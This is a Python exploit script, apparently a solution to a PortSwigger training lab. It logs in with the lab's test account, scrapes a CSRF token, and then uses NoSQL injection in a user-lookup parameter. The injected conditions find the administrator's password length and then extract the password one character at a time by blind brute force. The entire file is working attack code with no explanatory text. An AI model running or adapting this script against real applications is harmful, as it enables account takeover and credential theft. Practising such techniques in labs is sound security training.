import requests
import argparse
import string 
from bs4 import BeautifulSoup
import json

wordlist=string.ascii_lowercase

parser=argparse.ArgumentParser(prog="Portsiwgger - Exploiting NoSQL injection to extract data")
parser.add_argument("-u","--url",required=True)
arg=parser.parse_args()

session=requests.Session()

get_request= session.get(url=arg.url+"/login")
soap=BeautifulSoup(get_request.text,"html.parser")
inputs=soap.find_all("input")
csrf_value=None
password_len=None
Full_passowrd=[]
for i in inputs:
    if i.get("name")=="csrf":
        csrf_value=i.get("value")

credentails={"username":"wiener","password":"peter","csrf":csrf_value}
login_req = session.post(url=arg.url+"/login",data=credentails,allow_redirects=True)

get_user_info=session.get(arg.url+"/user/lookup?user=administrator")
json_response=get_user_info.json()
if json_response:
    print(f"[+] Found Email: {json_response["email"]}\n[+] Found role: {json_response['role']}\n[+] Found username: {json_response['username']}")
    print("[+] Retrive Password Lenght ..")
    for i in range(1,15):
        password_lenght=session.get(arg.url+f"/user/lookup?user=administrator'%26%26+this.password.length=={i}||'")
        password_lenght_json=password_lenght.json()
        try:
            if password_lenght_json['username']:
                print(f"[+] Password Length: {i}")
                password_lenght=i
                break
        except: continue
    print("[+] Extracting administrator Password: ...")

for i in range(0,password_lenght):
    for w in wordlist:
        password_extract=session.get(arg.url+f"/user/lookup?user=administrator'%26%26+this.password[{i}]=='{w}'||'")
        password_char=password_extract.json()
        try:
            password_char['username']
            Full_passowrd.append(w)
            print(f"[+] Extracted: {"".join(Full_passowrd)}")
            break
        except KeyError:continue

print(f"[+] Password Extracted Successfully: {"".join(Full_passowrd)}")
